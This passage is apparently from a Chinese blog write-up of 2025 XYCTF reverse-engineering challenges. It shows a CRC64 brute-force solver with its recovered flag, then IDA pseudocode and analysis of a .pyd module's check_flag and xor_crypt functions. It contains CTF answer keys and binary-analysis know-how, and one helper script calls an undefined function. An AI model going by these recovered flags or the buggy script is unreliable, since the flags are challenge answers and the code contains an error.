<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">POLY = <span class="number">0x42F0E1EBA9EA3693</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc64_ecma</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    crc = <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">        crc ^= b &lt;&lt; <span class="number">56</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> crc &amp; (<span class="number">1</span> &lt;&lt; <span class="number">63</span>):</span><br><span class="line">                crc = (crc &lt;&lt; <span class="number">1</span>) ^ POLY</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                crc &lt;&lt;= <span class="number">1</span></span><br><span class="line">            crc &amp;= <span class="number">0xFFFFFFFFFFFFFFFF</span>  <span class="comment"># 强制截断为64位</span></span><br><span class="line">    <span class="keyword">return</span> crc ^ <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">enc_values = [</span><br><span class="line">    -<span class="number">2565957437423125689</span>,</span><br><span class="line">    <span class="number">224890624719110086</span>,</span><br><span class="line">    <span class="number">1357324823849588894</span>,</span><br><span class="line">    -<span class="number">8941695979231947288</span>,</span><br><span class="line">    -<span class="number">253413330424273460</span>,</span><br><span class="line">    -<span class="number">7817463785137710741</span>,</span><br><span class="line">    -<span class="number">5620500441869335673</span>,</span><br><span class="line">    <span class="number">984060876288820705</span>,</span><br><span class="line">    -<span class="number">6993555743080142153</span>,</span><br><span class="line">    -<span class="number">7892488171899690683</span>,</span><br><span class="line">    <span class="number">7190415315123037707</span>,</span><br><span class="line">    -<span class="number">7218240302740981077</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转成无符号表示</span></span><br><span class="line">enc_values = [v &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span> <span class="keyword">for</span> v <span class="keyword">in</span> enc_values]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> target <span class="keyword">in</span> enc_values:</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            chunk = <span class="built_in">bytes</span>([a, b])</span><br><span class="line">            <span class="keyword">if</span> crc64_ecma(chunk) == target:</span><br><span class="line">                flag += chunk</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Failed to find match for <span class="subst">&#123;target&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Recovered flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406224605129.png"
                      class=""
                >
<p>flag{LLVM_1s_Fun_Ri9h7?}</p>
<h4 id="re-moon">re-Moon</h4>
<p>有个.py和.pyd文件，py文件里面使用了pyd</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> moon </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I tried my best, to live an ordinary life.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;But I hope you can look up and see the moonlight through reverse engineering on the streets full of sixpence.&quot;</span>)</span><br><span class="line"></span><br><span class="line">user_input = <span class="built_in">input</span>(<span class="string">&quot;Enter your flag: &quot;</span>).strip()</span><br><span class="line"></span><br><span class="line">result, error = moon.check_flag(user_input)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> error:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error.&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> result:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;I think you have found the right way.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;You seem to be lost.&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>就要知道pyd在python那个版本下的，在自己的3.12不对，运气好直接在虚拟机的3.11直接成功</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-222151-1744002931594-1.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-115925-1744002931594-3.png"
                      class=""
                >
<p>然后用ida看了看，找到很多函数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-223944-1744002931594-2.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-134853-1744002931594-4.png"
                      class=""
                >
<p>有xor异或的函数，还有targethex（用于异或的16进制），seed种子</p>
<p>然后让ai分析了一下，找了找函数，交叉引用了两个关键函数，check和xor发现</p>
<p>这个check：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_180001A00(__int64 a1, __int64 *a2, __int64 a3, __int64 a4)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; // rcx</span><br><span class="line">  __int64 *v5; // rbp</span><br><span class="line">  int v7; // esi</span><br><span class="line">  __int64 v8; // rax</span><br><span class="line">  __int64 v9; // rbx</span><br><span class="line">  __int64 v10; // rbx</span><br><span class="line">  __int64 v11; // rdx</span><br><span class="line">  _QWORD v13[3]; // [rsp+40h] [rbp-18h] BYREF</span><br><span class="line">  __int64 v14; // [rsp+68h] [rbp+10h] BYREF</span><br><span class="line"></span><br><span class="line">  v4 = 0LL;</span><br><span class="line">  v5 = &amp;a2[a3];</span><br><span class="line">  v14 = 0LL;</span><br><span class="line">  v7 = a4;</span><br><span class="line">  v13[1] = 0LL;</span><br><span class="line">  v13[0] = (char *)off_18000B618 + 192;</span><br><span class="line">  if ( !a4 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a3 == 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *a2;</span><br><span class="line">      return sub_180001B70(v4, v8);</span><br><span class="line">    &#125;</span><br><span class="line">    goto LABEL_14;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a3 == 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *a2;</span><br><span class="line">      v9 = *(_QWORD *)(a4 + 16);</span><br><span class="line">      v14 = *a2;</span><br><span class="line">      goto LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_14:</span><br><span class="line">    PyErr_Format(</span><br><span class="line">      PyExc_TypeError,</span><br><span class="line">      &quot;%.200s() takes %.8s %zd positional argument%.1s (%zd given)&quot;,</span><br><span class="line">      &quot;check_flag&quot;,</span><br><span class="line">      &quot;exactly&quot;,</span><br><span class="line">      1uLL,</span><br><span class="line">      byte_1800084C0,</span><br><span class="line">      a3);</span><br><span class="line">    v11 = 2805LL;</span><br><span class="line">    goto LABEL_15;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = *(_QWORD *)(a4 + 16);</span><br><span class="line">  v8 = sub_180003EA0(a4, v5, *((_QWORD *)off_18000B618 + 24));</span><br><span class="line">  v14 = v8;</span><br><span class="line">  if ( !v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( PyErr_Occurred() )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = 2789LL;</span><br><span class="line">      goto LABEL_15;</span><br><span class="line">    &#125;</span><br><span class="line">    goto LABEL_14;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = v10 - 1;</span><br><span class="line">LABEL_7:</span><br><span class="line">  if ( v9 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (int)sub_1800040C0(v7, (_DWORD)v5, (unsigned int)v13, a4, (__int64)&amp;v14, a3, (__int64)&quot;check_flag&quot;) &lt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = 2794LL;</span><br><span class="line">LABEL_15:</span><br><span class="line">      sub_180005D40(&quot;moon.check_flag&quot;, v11, 10LL, &quot;moon.py&quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v8 = v14;</span><br><span class="line">  &#125;</span><br><span class="line">  return sub_180001B70(v4, v8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>和xor：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_180001130(__int64 a1, __int64 *a2, __int64 a3, __int64 a4)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 *v5; // r14</span><br><span class="line">  _QWORD *v6; // r8</span><br><span class="line">  _QWORD *v8; // rcx</span><br><span class="line">  __int64 v9; // rbx</span><br><span class="line">  __int64 v10; // rdi</span><br><span class="line">  __int64 v11; // rdx</span><br><span class="line">  __int128 v13; // [rsp+40h] [rbp-58h] BYREF</span><br><span class="line">  _QWORD v14[3]; // [rsp+50h] [rbp-48h] BYREF</span><br><span class="line"></span><br><span class="line">  v14[2] = 0LL;</span><br><span class="line">  v5 = &amp;a2[a3];</span><br><span class="line">  v6 = off_18000B618;</span><br><span class="line">  v13 = 0LL;</span><br><span class="line">  v8 = (_QWORD *)((char *)off_18000B618 + 264);</span><br><span class="line">  v14[0] = (char *)off_18000B618 + 264;</span><br><span class="line">  v14[1] = (char *)off_18000B618 + 136;</span><br><span class="line">  if ( !a4 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a3 == 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = *a2;</span><br><span class="line">      *((_QWORD *)&amp;v13 + 1) = a2[1];</span><br><span class="line">      return sub_180001370(v8, v9, *((_QWORD *)&amp;v13 + 1));</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_25:</span><br><span class="line">    PyErr_Format(</span><br><span class="line">      PyExc_TypeError,</span><br><span class="line">      &quot;%.200s() takes %.8s %zd positional argument%.1s (%zd given)&quot;,</span><br><span class="line">      &quot;xor_crypt&quot;,</span><br><span class="line">      &quot;exactly&quot;,</span><br><span class="line">      2uLL,</span><br><span class="line">      &quot;s&quot;,</span><br><span class="line">      a3);</span><br><span class="line">    v11 = 2531LL;</span><br><span class="line">    goto LABEL_26;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a3 != 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( a3 != 2 )</span><br><span class="line">        goto LABEL_25;</span><br><span class="line">      *((_QWORD *)&amp;v13 + 1) = a2[1];</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = *a2;</span><br><span class="line">    *(_QWORD *)&amp;v13 = *a2;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = v13;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = *(_QWORD *)(a4 + 16);</span><br><span class="line">  if ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a3 != 1 )</span><br><span class="line">      goto LABEL_15;</span><br><span class="line">    goto LABEL_13;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)&amp;v13 = sub_180003EA0(a4, v5, *v8);</span><br><span class="line">  v9 = v13;</span><br><span class="line">  if ( !(_QWORD)v13 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( PyErr_Occurred() )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = 2503LL;</span><br><span class="line">      goto LABEL_26;</span><br><span class="line">    &#125;</span><br><span class="line">    goto LABEL_25;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = off_18000B618;</span><br><span class="line">  --v10;</span><br><span class="line">LABEL_13:</span><br><span class="line">  *((_QWORD *)&amp;v13 + 1) = sub_180003EA0(a4, v5, v6[17]);</span><br><span class="line">  if ( !*((_QWORD *)&amp;v13 + 1) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( PyErr_Occurred() )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = 2511LL;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      PyErr_Format(</span><br><span class="line">        PyExc_TypeError,</span><br><span class="line">        &quot;%.200s() takes %.8s %zd positional argument%.1s (%zd given)&quot;,</span><br><span class="line">        &quot;xor_crypt&quot;,</span><br><span class="line">        &quot;exactly&quot;,</span><br><span class="line">        2uLL,</span><br><span class="line">        &quot;s&quot;,</span><br><span class="line">        1uLL);</span><br><span class="line">      v11 = 2513LL;</span><br><span class="line">    &#125;</span><br><span class="line">    goto LABEL_26;</span><br><span class="line">  &#125;</span><br><span class="line">  --v10;</span><br><span class="line">LABEL_15:</span><br><span class="line">  if ( v10 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (int)sub_1800040C0(a4, (_DWORD)v5, (unsigned int)v14, a4, (__int64)&amp;v13, a3, (__int64)&quot;xor_crypt&quot;) &lt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = 2518LL;</span><br><span class="line">LABEL_26:</span><br><span class="line">      sub_180005D40(&quot;moon.xor_crypt&quot;, v11, 3LL, &quot;moon.py&quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = v13;</span><br><span class="line">  &#125;</span><br><span class="line">  return sub_180001370(v8, v9, *((_QWORD *)&amp;v13 + 1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>分析了一下，40c0应该就是chek函数，1b70就是xor函数，并且xor函数传参是两个</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250407094553817.png"
                      class=""
                >
<p>xor_crypt 的关键逻辑：</p>
<ol type="1">
<li>要求 2 个参数（<code>a2[0]</code>, <code>a2[1]</code>）：
<ul>
<li><code>v9 = *a2</code> 是第一个参数（待加密或解密的数据）</li>
<li><code>*((_QWORD *)&amp;v13 + 1) = a2[1]</code> 是 key</li>
</ul></li>
<li>调用 <code>sub_180001370(v8, v9, key)</code> 执行 XOR
操作，最后返回结果</li>
</ol>
<p>所以 <strong><code>xor_crypt(data, key)</code> =
<code>sub_180001370(data, key)</code></strong>
是我们要重点还原的函数，几乎可以肯定它就是执行字节级异或。</p>
<p>反正ai分析了很多</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250407095010649.png"
                      class=""
                >
<p>最后尝试直接用 Python 脚本调用 .pyd，测试 xor_crypt()与
check_flag()，观察行为。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250407095222970.png"
                      class=""
                >
<p>说是moon.xor_crypt()要两个参数，而moon.check_flag()要一个参数，moon.check_flag()这个好理解，直接是输入flag检查，moon.xor_crypt()这个根据上面的分析，应该是有个密钥（也就是看到的seed种子，后面试出来的，嘻嘻）然后就有了接下来的ai对话：</p>
<p>问了一下模型，让他写了个脚本，找出模块内有哪些变量/函数/模块</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_pyd_module</span>(<span class="params">pyd_path</span>):</span><br><span class="line">    module_name = os.path.splitext(os.path.basename(pyd_path))[<span class="number">0</span>]</span><br><span class="line">    spec = importlib.util.spec_from_file_location(module_name, pyd_path)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ImportError(<span class="string">f&quot;Could not load spec from <span class="subst">&#123;pyd_path&#125;</span>&quot;</span>)</span><br><span class="line">    module = importlib.util.module_from_spec(spec)</span><br><span class="line">    spec.loader.exec_module(module)</span><br><span class="line">    <span class="keyword">return</span> module</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hlep_raw</span>(<span class="params">module</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;分析模块：<span class="subst">&#123;module.__name__&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">dir</span>(module):</span><br><span class="line">        <span class="keyword">if</span> name.startswith(<span class="string">&quot;__&quot;</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;发现对象: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            obj = <span class="built_in">getattr</span>(module, name)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  类型: <span class="subst">&#123;<span class="built_in">type</span>(obj)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  文档: <span class="subst">&#123;<span class="built_in">getattr</span>(obj, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;无&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  无法访问: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;用法: python hlep.py &lt;路径/模块.pyd&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    pyd_path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(pyd_path) <span class="keyword">or</span> <span class="keyword">not</span> pyd_path.endswith(<span class="string">&quot;.pyd&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请提供有效的 .pyd 文件路径&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mod = load_pyd_module(pyd_path)</span><br><span class="line">        hlep(mod)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;加载模块失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(mod))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">dir</span>(mod):</span><br><span class="line">    <span class="keyword">if</span> name.startswith(<span class="string">&quot;__&quot;</span>): <span class="keyword">continue</span></span><br><span class="line">    obj = <span class="built_in">getattr</span>(mod, name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> -&gt; <span class="subst">&#123;<span class="built_in">type</span>(obj)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">dir</span>(mod):</span><br><span class="line">    <span class="keyword">if</span> name.startswith(<span class="string">&quot;__&quot;</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    obj = <span class="built_in">getattr</span>(mod, name)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">callable</span>(obj):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>() 可调用，类型: <span class="subst">&#123;<span class="built_in">type</span>(obj)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        </span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-06-222926.png"
                      class=""
                >
<p>看到有这些玩意儿，让他提取这些的值</p>
